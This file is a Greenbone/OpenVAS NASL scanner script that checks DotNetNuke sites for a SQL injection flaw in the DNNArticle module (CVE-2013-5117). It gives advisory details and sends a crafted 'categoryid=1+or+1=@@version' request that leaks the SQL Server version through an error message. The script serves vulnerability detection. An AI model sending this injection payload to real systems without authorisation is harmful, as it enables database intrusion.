# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dotnetnuke:dotnetnuke";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803868");
  script_version("2025-07-22T05:43:35+0000");
  script_cve_id("CVE-2013-5117");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-07-22 05:43:35 +0000 (Tue, 22 Jul 2025)");
  script_tag(name:"creation_date", value:"2013-08-19 11:59:21 +0530 (Mon, 19 Aug 2013)");
  script_name("DotNetNuke < 10.1 DNNArticle Module SQLi Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dotnetnuke_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dotnetnuke/http/detected");

  script_tag(name:"summary", value:"DotNetNuke DNNArticle module is prone to a SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'categoryid' GET parameter to
  'desktopmodules/dnnarticle/dnnarticlerss.aspx' (when 'moduleid' is set) is not properly sanitized
  before being used in a SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"DotNetNuke DNNArticle module version 10.0 and prior.");

  script_tag(name:"solution", value:"Update to version 10.1 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54545");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61788");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27602");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122824");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/DesktopModules/DNNArticle/DNNArticleRSS.aspx?"+
            "moduleid=0&categoryid=1+or+1=@@version";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"converting the nvarchar.*Microsoft SQL Server.*([0-9.]+)" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
